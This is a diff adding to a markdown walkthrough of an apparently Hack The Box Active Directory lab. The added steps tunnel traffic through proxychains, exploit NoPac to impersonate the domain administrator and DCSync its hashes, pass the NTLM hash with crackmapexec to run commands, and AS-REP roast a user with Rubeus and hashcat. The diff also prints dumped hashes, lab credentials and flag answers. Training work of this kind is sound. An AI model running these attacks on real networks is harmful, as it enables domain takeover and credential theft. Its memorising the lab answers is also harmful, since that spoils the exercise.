@@ -3764,6 +3764,96 @@ xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
 Results: 1m_the_sQl_@dm1n_n0w!
 
 
+**Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)**
+
+Results: 2021-42278&2021-42287
+
+
+**Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.**
+
+```
+# Add this line to the proxychains file /etc/proxychains
+socks5 127.0.0.1 1234
+
+# Establish a tunnel connection
+ssh htb-student@$ip -D 1234
+
+# Now from my attacker machine, test the NoPac vulnerability. First we will run an scanner from the host machine:
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+```
+
+It will return: 
+
+```bash
+# it will save the file administrator_ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.ccache
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
+ ```
+
+We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account:
+
+```bash
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+```
+
+It will return:
+
+```
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+```
+
+whereas the NTLM hash is 88ad09182de639ccc6579eb0849751cf. Now we can use crackmapexec (for instance):
+
+```
+proxychains crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  -x 'type C:\Users\Administrator\Desktop\DailyTasks\flag.txt' --exec-method smbexec
+```
+
+Results: D0ntSl@ckonN0P@c!
+
+
+**RDP to  (ACADEMY-EA-MS01) ,10.129.32.8 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!". Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".**
+
+```
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+
+Results: ygroce
+
+
+ **Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.**
+
+```
+# Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+Import-Module .\PowerView.ps1
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+# Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
+.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
+
+# Cracking the Hash Offline with Hashcat:
+hashcat -m 18200 ygroce /usr/share/wordlists/rockyou.txt
+```
+
+Results: Pass@word
+
+### Why So Trusting?
+
+Question
+
+```
+
+```
+
+Results:
+
+
+
 Question
 
 ```
